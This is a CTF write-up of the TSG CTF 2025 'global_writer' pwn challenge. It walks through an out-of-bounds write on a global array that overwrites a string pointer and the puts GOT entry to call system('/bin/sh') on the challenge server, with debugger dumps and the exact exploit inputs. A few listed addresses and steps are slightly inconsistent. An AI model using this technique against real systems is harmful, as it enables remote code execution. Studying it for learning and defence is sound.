---
title: "TSG CTF 2025 Writeup: global_writer [Pwn]"
date: "2025-12-21"
description: "Writeup for the global_writer Pwn challenge of the TSG CTF 2025."
---

# TSG CTF 2025 Writeup: global_writer [Pwn]

#### December 5, 2025

This is a Pwn challenge for the TSG 2025 CTF, made by shashiming. The description for it is: "Just make 'em all global. Way easier.".

## The source code

For this challenge, other than the binary and a Dockerfile to run the server, we are given the source of the binary. Let's take a look at it

```c
// gcc -no-pie -Wl,-z,relro -fstack-protector-all -o chal src.c

#include <stdio.h>
#include <stdlib.h>
#define SIZE 0x10

char *msg = "Update Complete";
int values[SIZE];
int idx, i;

void handle_error() {
  system("echo ERROR OCCURRED");
  exit(1);
}

void edit() {
  while (1) {
    printf("index? > ");
    if (scanf("%d", &idx) != 1) {
      handle_error();
    }
    if (idx == -1) {
      break;
    }
    printf("value? > ");
    if (scanf("%d", &values[idx]) != 1) {
      handle_error();
    }
  }

  puts(msg);
  printf("Array: ");
  for (i = 0; i < SIZE; i++) {
    printf("%d ", values[i]);
  }
  printf("\n");
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  edit();
  return 0;
}
```

Taking a look at `edit()`, the function that allows us to input data, we can see how we'll have to give an index and then the value that will be stored in that index of the array `values`.  We'll be able to store data to this array until we select index -1.

Interestingly though, `values` is not a local variable, it's a **global variable**. This moves stack overflows out of the question, as the array indexes are going to be **in memory.** This is why the author of this challenge hinted global variables in the description.

Since we'll be writing somewhere in memory (to hopefully overflow it), it'd make sense to check where exactly the array is located, and see what's around it. To inspect the binary, I'll be using `pwndbg`.

## Looking around

Since the array is a global variable, we can easily check its address with `info variables`:

```
pwndbg> info variables
...
0x00000000004040c0  values
...
```

Before inspecting the address region, I'll run the program and add a breakpoint on startup, just so we allow the program to load its variables and memory regions.

```
pwngdb> break main
Breakpoint 1 at 0x4013b1
pwndbg> run
```

Now, let's see what's next to the `values` address:

```
pwndbg> x/32gx 0x4040c0
0x4040c0 <values>:	0x0000000000000000	0x0000000000000000
0x4040d0 <values+16>:	0x0000000000000000	0x0000000000000000
0x4040e0 <values+32>:	0x0000000000000000	0x0000000000000000
0x4040f0 <values+48>:	0x0000000000000000	0x0000000000000000
0x404100 <idx>:	0x0000000000000000	0x0000000000000000
0x404110:	0x0000000000000000	0x0000000000000000
0x404120:	0x0000000000000000	0x0000000000000000
0x404130:	0x0000000000000000	0x0000000000000000
0x404140:	0x0000000000000000	0x0000000000000000
0x404150:	0x0000000000000000	0x0000000000000000
0x404160:	0x0000000000000000	0x0000000000000000
0x404170:	0x0000000000000000	0x0000000000000000
0x404180:	0x0000000000000000	0x0000000000000000
0x404190:	0x0000000000000000	0x0000000000000000
0x4041a0:	0x0000000000000000	0x0000000000000000
0x4041b0:	0x0000000000000000	0x0000000000000000
```

Nothing out of the ordinary. We can see the memory range of  `values`, empty for now, and after that we can see `idx`, a global variable defined after `values` in the source code. This is what's after `values`, let's see what's before it. For that, I'll just plug in a lower address, like `0x404000`:

```
pwndbg> x/32gx 0x404000
0x404000:	0x0000000000403e20	0x00007ffff7ffe310
0x404010:	0x00007ffff7fd9610	0x0000000000401030
0x404020 <puts@got.plt>:	0x0000000000401040	0x0000000000401050
0x404030 <setbuf@got.plt>:	0x0000000000401060	0x0000000000401070
0x404040 <printf@got.plt>:	0x0000000000401080	0x0000000000401090
0x404050 <exit@got.plt>:	0x00000000004010a0	0x0000000000000000
0x404060:	0x0000000000000000	0x0000000000402004
0x404070:	0x0000000000000000	0x0000000000000000
0x404080 <stdout@GLIBC_2.2.5>:	0x00007ffff7f9e5c0	0x0000000000000000
0x404090 <stdin@GLIBC_2.2.5>:	0x00007ffff7f9d8e0	0x0000000000000000
0x4040a0 <stderr@GLIBC_2.2.5>:	0x00007ffff7f9e4e0	0x0000000000000000
0x4040b0:	0x0000000000000000	0x0000000000000000
0x4040c0 <values>:	0x0000000000000000	0x0000000000000000
0x4040d0 <values+16>:	0x0000000000000000	0x0000000000000000
0x4040e0 <values+32>:	0x0000000000000000	0x0000000000000000
0x4040f0 <values+48>:	0x0000000000000000	0x0000000000000000
```

Nice.

Someone that has worked with dynamic linking attacks would be devilishly rubbing its hands right now. The **PLT table** is located very close to `values`.  Reading about **PLT/GOT** is highly advised if you haven't already, I highly recommend [this article](https://can-ozkan.medium.com/got-vs-plt-in-binary-analysis-888770f9cc5a) to understand the basics; but essentially, we can overwrite the pointers to the functions in the PLT to make them **execute a different function**. In the source code, in `handle_error()`, we can notice a `system()` function. What would happen if we overwrote the pointer of `puts()`, so that instead of linking the PLT to `puts()` it linked to `system()`? This would make it so that for every `puts()` called in the code, instead of executing the `puts()` code, it would execute the `system()` code, potentially granting us access to **arbitrary code execution** in the machine.

## Function arguments

Granted, that wouldn't be enough, because both `puts()` and `system()` have their own string arguments ("Update Complete" and "echo ERROR OCCURRED" respectively, looking at the source code). This means that even if we do manage to run `system()` for every `puts()` call, the argument would be "Update Complete". That would naturally raise an error, because it's not a valid command. Thus, we'll have to find a workaround for that.

We're in luck, because the string `msg`, which is the string used as the argument in `puts()` (which will later become `system()`) is actually a **global variable** too, and its address is even closer to the array `values`:

```
pwndbg> p &msg
$1 = (<data variable, no debug info> *) 0x404068 <msg>
```

In C, a string is a pointer, and this is no exception. The value in the memory address `0x404068` will be **another address**, that will actually contain the content of the string: its characters. So, if we overwrite the value of `msg` so that we write an address we can write whatever string we want to, we'll be able to **modify the string**. And in what addresses can we write on with seemingly no limitations? In `values` of course, with the use of the function `edit()` of the binary!

## Overwriting global variables

In order to overwrite `msg`, considering it's behind `values` in memory, we'll need to write in a negative of `values`. To calculate in which, we can do `x/32gx &msg` and start counting down for every 4 bytes from `values` until the address of `msg`. We get  -22. So, to overwrite `msg`, we'll have to write in the index -22 of `values`. What do we want to write there? Well, any address inside `values` works, I'll use the first one, `0x4040c0`. In this address, I'll have to write whatever I want the argument of `system()` to be. Since we want full control of the system, we can write `/bin/sh` in there. With this argument in `system()`, a shell will be opened, so that later we can `cat` into the flag.

That's the first step done! Let's write this down for now:

```
1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the string "/bin/sh"
```

Actually, there's a small issue with this. `values` is an array of **integers**, which means that each index has the capacity for **4 bytes**, four characters in total. This makes us have to split the string in two. In the first index we'll write "/bin", and in the next one we'll write "/sh".

```
1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the string "/bin"
3. Write in index 1 (address 0x4040c1) the string "/sh"
```

Let's turn the strings into its ASCII hexadecimal equivalents:

```
1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the value 0x6E69622F
3. Write in index 1 (address 0x4040c1) the value 0x68732F
```
## The dynamic link attack

Now let's do the fun part. We've changed `msg` so that the argument that `put()` receives is `/bin/sh`, a valid command. Now we just need to make `put()` actually call `system()`, as we've said before. First, let's see where `system()` is located.

The PLT (Procedure Linkage Table) is used to perform a technique called "**Lazy Linking**", where a function is only linked to the binary when it's needed. In order to know its address, the PLT communicates with the GOT (Global Offset Table), which knows the address of these functions. To check the GOT, we can execute the `got` command:

```
pwndbg> got
...
[0x404030] setbuf@GLIBC_2.2.5 -> 0x7ffff7e3d920 (setbuf) ◂— mov edx, 0x2000
[0x404038] system@GLIBC_2.2.5 -> 0x401070 ◂— endbr64 
[0x404040] printf@GLIBC_2.2.5 -> 0x7ffff7e0f900 (printf) ◂— sub rsp, 0xd8
...
```

There's `system()`, with its address (0x401070). With that out of the way, we can start focusing on the overwrite.

```
0x404000:	0x0000000000403e20	0x00007ffff7ffe310
0x404010:	0x00007ffff7fd9610	0x0000000000401030
0x404020 <puts@got.plt>:	0x0000000000401040	0x0000000000401050
0x404030 <setbuf@got.plt>:	0x0000000000401060	0x0000000000401070
0x404040 <printf@got.plt>:	0x0000000000401080	0x0000000000401090
0x404050 <exit@got.plt>:	0x00000000004010a0	0x0000000000000000
0x404060:	0x0000000000000000	0x0000000000402004
0x404070:	0x0000000000000000	0x0000000000000000
0x404080 <stdout@GLIBC_2.2.5>:	0x00007ffff7f9e5c0	0x0000000000000000
0x404090 <stdin@GLIBC_2.2.5>:	0x00007ffff7f9d8e0	0x0000000000000000
0x4040a0 <stderr@GLIBC_2.2.5>:	0x00007ffff7f9e4e0	0x0000000000000000
0x4040b0:	0x0000000000000000	0x0000000000000000
0x4040c0 <values>:	0x0000000000000000	0x0000000000000000
0x4040d0 <values+16>:	0x0000000000000000	0x0000000000000000
0x4040e0 <values+32>:	0x0000000000000000	0x0000000000000000
0x4040f0 <values+48>:	0x0000000000000000	0x0000000000000000
```

Looking at the PLT and `values`, yet again we need to calculate the index we'll need to write on to overwrite exactly the address in `puts()`. Using the same trick as before (and maybe some trial and error on the way), we get -40 as the index. In that address, we'll write the already known `system()` address. Let's note this down:

```
3. Write in index -40 the system() address (0x401070)
```

## Performing the exploit

We now have everything we need to perform the exploit. Let's take a look at the list we've written:

```
1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the value 0x6E69622F
3. Write in index 1 (address 0x4040c1) the value 0x68732F
```

Normally, payloads like these are automated with a Python script with `pwntools`. I'll write them in manually, which is also not that difficult, and I think it's a more visual approach for a writeup. However, since the values taken by the `edit()` function are **decimal integers**, we'll need to translate our hexadecimal addresses to decimal:

```
1. Write in index -22 the value 4210880
2. Write in index 0 (address 4210880) the value 1852400175
3. Write in index 1 (address 4210881) the value 6845231
4. Write in index -40 the system() address (4198512)
```

Now we just need to connect to the server and see if what we've done is correct:

```
$ nc 34.84.25.24 58554
index? > -22
value? > 4210880
index? > 0
value? > 1852400175
index? > 1
value? > 6845231
index? > -40
value? > 4198512
index? >
```

Everything is set up now. All we need is to somehow execute `system()`.

```
void edit() {
  while (1) {
    printf("index? > ");
    if (scanf("%d", &idx) != 1) {
      handle_error();
    }
    if (idx == -1) {
      break;
    }
    printf("value? > ");
    if (scanf("%d", &values[idx]) != 1) {
      handle_error();
    }
  }

  puts(msg);
  printf("Array: ");
  for (i = 0; i < SIZE; i++) {
    printf("%d ", values[i]);
  }
  printf("\n");
}
```

Looking at the code, and the fact that we've replaced the `puts()` call with the `system()` code, including its argument, all we need to do is get to a `puts()` call. In order to get to it, we just need to break the `while` loop by selecting the index -1 next:

```
index? > -1

```

Nothing showed up! This is actually great news, because **the shell has opened**. We have full control over the machine, so let's give ourselves the freedom of seeing what's on it:

```
ls
chal
flag-5f58d5916588b60b33a904537af3a564.txt
start.sh
```

After running `ls` we can see that the flag is right there. With the use of a wildcard to avoid having to write in all those numbers, we can `cat` into the flag:

```
cat f*
TSGCTF{6O7_4nd_6lob4l_v4r1able5_ar3_4dj4c3n7_1n_m3m0ry_67216011}
```

That's it!

## Conclusion

The key of this challenge was that global variables tend to be close to the PLT/GOT region of our binary. If the binary isn't properly protected, nothing stops us from modifying the values of our global variables or PLT entries. This is where the vulnerability lied. By overwriting certain entries and creating our own argument in `msg` to open a shell, we've managed to turn a seemingly harmless function into one that granted us access to the server.